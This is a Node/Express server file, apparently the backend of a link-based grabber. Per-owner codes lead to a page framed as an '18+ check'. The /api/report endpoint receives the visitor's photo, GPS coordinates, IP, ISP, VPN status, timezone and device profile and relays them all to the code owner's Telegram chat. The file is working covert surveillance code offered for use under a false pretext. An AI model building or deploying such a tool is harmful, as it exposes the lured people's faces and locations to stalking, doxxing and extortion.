// === server/index.js (code -> chat_id, pretty /:code, понятные ошибки) ===
import 'dotenv/config';
import express from 'express';
import path from 'path';
import fs from 'fs';
import Database from 'better-sqlite3';
import { fileURLToPath } from 'url';
// NEW: FormData/Blob из undici для совместимости (Node 18+ уже ок, но так надёжнее)
import { FormData, Blob } from 'undici';

// ==== ENV ====
const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN || '';
const STATIC_ORIGIN    = (process.env.STATIC_ORIGIN || '*').trim();
const PUBLIC_BASE      = (process.env.PUBLIC_BASE || STATIC_ORIGIN).replace(/\/+$/, '');
const ADMIN_API_SECRET = process.env.ADMIN_API_SECRET || '';
const DB_PATH          = process.env.DB_PATH || './data/links.db';
const PORT             = Number(process.env.PORT || 10000);

// ==== Paths / Static ====
const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);
const PUBLIC_DIR = path.join(__dirname, 'public');

// ==== App ====
const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));

// --- CORS
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
app.options('*', (_, res) => res.sendStatus(200));

// --- cache headers for static
app.use((req, res, next) => {
  if (/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?)$/i.test(req.path)) {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }
  next();
});

// --- static
app.use(express.static(PUBLIC_DIR));
app.get('/', (_req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.html')));

// ==== DB init ====
try {
  const dir = path.dirname(DB_PATH);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
} catch (e) {
  console.error('[db] mkdir failed for', DB_PATH, e);
}

console.log('[db] using', DB_PATH);
const db = new Database(DB_PATH);

// --- table (new scheme)
db.prepare(`
  CREATE TABLE IF NOT EXISTS user_codes (
    code       TEXT PRIMARY KEY,
    chat_id    TEXT NOT NULL,
    created_at INTEGER NOT NULL
  );
`).run();
db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_codes_chat_id ON user_codes(chat_id);`).run();

// ---- optional migrate.sql (будет выполнен, если файл есть)
try {
  const migratePath = path.join(__dirname, 'migrate.sql');
  if (fs.existsSync(migratePath)) {
    console.log('[migrate] applying migrate.sql...');
    db.exec(fs.readFileSync(migratePath, 'utf8'));
  }
} catch (e) {
  console.error('[migrate] failed', e);
}

// ==== helpers ====
function requireAdminSecret(req, res, next) {
  const auth = req.headers['authorization'] || '';
  if (!ADMIN_API_SECRET || auth !== `Bearer ${ADMIN_API_SECRET}`) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }
  next();
}

function escapeHTML(s = '') {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
function b64ToBuffer(dataUrl = '') {
  const i = dataUrl.indexOf('base64,');
  const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
  return Buffer.from(b64, 'base64');
}

// NEW: безопасный разбор клиентского IP/заголовков
function extractClientIp(req) {
  const xff = (req.headers['x-forwarded-for'] || '').toString();
  const chain = xff.split(',').map(s => s.trim()).filter(Boolean);
  // первый из списка — исходный клиент (за CDN/прокси)
  const ip = chain[0] || req.headers['cf-connecting-ip'] || req.ip || req.socket?.remoteAddress || null;
  return String(ip || '').replace(/^::ffff:/, '') || null;
}
function pickHeader(req, name) {
  const v = req.headers[name];
  if (!v) return null;
  if (Array.isArray(v)) return v[0];
  return String(v);
}

// NEW: Telegram helpers
async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
  if (!BOT_TOKEN) throw new Error('No BOT token on server');
  if (!chatId) throw new Error('Missing chat_id');
  if (!photoBuf?.length) throw new Error('Empty photo');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('parse_mode', 'HTML');
  form.append('photo', new Blob([photoBuf], { type: 'image/jpeg' }), filename);

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

// NEW: шлём JSON как документ (удобно для больших профилей)
async function sendJsonDocumentToTelegram({ chatId, filename, jsonObject }) {
  if (!BOT_TOKEN) throw new Error('No BOT token on server');
  const form = new FormData();
  form.append('chat_id', String(chatId));
  const jsonStr = JSON.stringify(jsonObject, null, 2);
  form.append('document', new Blob([jsonStr], { type: 'application/json' }), filename || 'details.json');
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

// ==== health & debug ====
app.get('/health', (_req, res) => res.json({ ok: true }));
app.get('/api/debug/db', (req, res) => {
  try {
    const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
    const codes = db.prepare('SELECT COUNT(*) AS c FROM user_codes').get().c;
    res.json({ ok:true, DB_PATH, size, codes });
  } catch (e) {
    res.status(500).json({ ok:false, error:String(e) });
  }
});

// NEW: API client-ip (для фронта)
app.get('/api/client-ip', (req, res) => {
  try {
    const ip    = extractClientIp(req);
    const cf    = {
      country: pickHeader(req,'cf-ipcountry'),
      colo: pickHeader(req,'cf-ray')?.split('-')[1] || null,
      city: pickHeader(req,'cf-ipcity') || null, // проксируются не всегда
      asn: pickHeader(req,'cf-asn') || null
    };
    // ISP/ORG можно пробрасывать с CDN/edge, если настроить. По умолчанию null.
    const out = {
      ip,
      country: cf.country || null,
      region: null,
      isp: null,
      edge: cf.colo || null,
      asn: cf.asn || null
    };
    res.json(out);
  } catch (e) {
    res.status(500).json({ ok:false, error:String(e) });
  }
});

// ==== Admin: register-code ====
app.post('/api/register-code', requireAdminSecret, (req, res) => {
  try {
    const { code, chatId } = req.body || {};
    if (!code || !/^[A-Z0-9\-]{3,40}$/i.test(code)) {
      return res.status(400).json({ ok:false, error:'Invalid code' });
    }
    if (!chatId || !/^-?\d+$/.test(String(chatId))) {
      return res.status(400).json({ ok:false, error:'Invalid chatId' });
    }
    db.prepare('INSERT OR REPLACE INTO user_codes(code, chat_id, created_at) VALUES(?,?,?)')
      .run(String(code).toUpperCase(), String(chatId), Date.now());
    res.json({ ok:true, code:String(code).toUpperCase(), chatId:String(chatId) });
  } catch (e) {
    console.error('[register-code] error:', e);
    res.status(500).json({ ok:false, error:'Internal' });
  }
});

// ==== Pretty URL: /:code -> index.html?code=... ====
app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
  const code = req.params.code.toString();
  let html = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
  const injected = html.replace(
    /<head>/i,
    `<head><script>history.replaceState(null,'','/index.html?code=${code}');</script>`
  );
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(injected);
});

// ==== API: report (отправка фото владельцу кода) ====
app.post('/api/report', async (req, res) => {
  try {
    // FRONT теперь присылает: userAgent, platform, iosVersion, isSafari, geo, photoBase64, note, code,
    // а также device_check и client_profile (см. app.js)
    const {
      userAgent, platform, iosVersion, isSafari,
      geo, photoBase64, note, code,
      device_check, client_profile
    } = req.body || {};

    if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
    if (!photoBase64) return res.status(400).json({ ok:false, error: 'No photoBase64' });

    const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?')
      .get(String(code).toUpperCase());
    if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });

    // Серверные метаданные
    const ip     = extractClientIp(req);
    const ua     = String(userAgent || '');
    const plat   = String(platform || '');
    const safari = String(isSafari);
    const iosStr = (iosVersion ?? '') + '';
    const tz     = client_profile?.timezone || null;
    const pubIp  = client_profile?.publicIp?.ip || null;
    const pubCC  = client_profile?.publicIp?.country || null;
    const isp    = client_profile?.publicIp?.isp || null;
    const vpnLbl = client_profile?.vpnProxy?.label || null;

    // Компактная подпись для фото (всё остальное — JSON документом)
    const lines = [
      '<b>Новый отчёт 18+ проверка</b>',
      `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
      `UA: <code>${escapeHTML(ua)}</code>`,
      `Platform: <code>${escapeHTML(plat)}</code>`,
      `iOS-like: <code>${escapeHTML(iosStr)}</code>  Safari: <code>${escapeHTML(safari)}</code>`,
      geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : 'Geo: <code>нет</code>',
      ip ? `ServerIP: <code>${escapeHTML(ip)}</code>` : null,
      pubIp ? `PublicIP: <code>${escapeHTML(pubIp)}${pubCC ? ' ('+escapeHTML(pubCC)+')' : ''}${isp ? ', '+escapeHTML(isp) : ''}</code>` : null,
      vpnLbl ? `VPN/Proxy: <code>${escapeHTML(vpnLbl)}</code>` : null,
      tz ? `TZ: <code>${escapeHTML(tz)}</code>` : null,
      note ? `Note: <code>${escapeHTML(note)}</code>` : null
    ].filter(Boolean);

    // обрезаем если вдруг многовато (Telegram лимит ~1024-4096 символов)
    const caption = lines.join('\n').slice(0, 3500);

    const buf = b64ToBuffer(photoBase64);
    const sentPhoto = await sendPhotoToTelegram({
      chatId: String(row.chat_id),
      caption,
      photoBuf: buf
    });

    // Отдельно отправляем JSON с деталями (device_check + client_profile + server_seen)
    const details = {
      received_at: Date.now(),
      server_seen: {
        ip,
        headers: {
          'user-agent': pickHeader(req,'user-agent'),
          'cf-connecting-ip': pickHeader(req,'cf-connecting-ip'),
          'x-forwarded-for': pickHeader(req,'x-forwarded-for'),
          'cf-ipcountry': pickHeader(req,'cf-ipcountry'),
          'cf-ray': pickHeader(req,'cf-ray')
        },
        url: req.originalUrl
      },
      device_check: device_check || null,
      client_profile: client_profile || null,
      front_summary: { userAgent, platform, iosVersion, isSafari, geo, note, code }
    };

    let sentDoc = null;
    try {
      sentDoc = await sendJsonDocumentToTelegram({
        chatId: String(row.chat_id),
        filename: `report_${String(code).toUpperCase()}_${Date.now()}.json`,
        jsonObject: details
      });
    } catch (e) {
      console.warn('[report] sendDocument failed:', e?.message || e);
    }

    res.json({
      ok: true,
      sent: [
        { chatId: String(row.chat_id), ok: true, type: 'photo', message_id: sentPhoto?.result?.message_id || null },
        { chatId: String(row.chat_id), ok: !!sentDoc, type: 'document', message_id: sentDoc?.result?.message_id || null }
      ]
    });
  } catch (e) {
    console.error('[report] error:', e);
    res.status(500).json({ ok: false, error: e.message || 'Internal error' });
  }
});

// ==== 404 fallback ====
app.use((req, res) => {
  if (req.method === 'GET' && req.accepts('html')) return res.status(404).send('Not Found');
  res.status(404).json({ ok: false, error: 'Not Found' });
});

// ==== Start ====
app.listen(PORT, () => {
  console.log(`[server] listening on :${PORT}`);
  console.log(`[server] Public dir: ${PUBLIC_DIR}`);
  console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
  console.log(`[server] PUBLIC_BASE: ${PUBLIC_BASE}`);
});
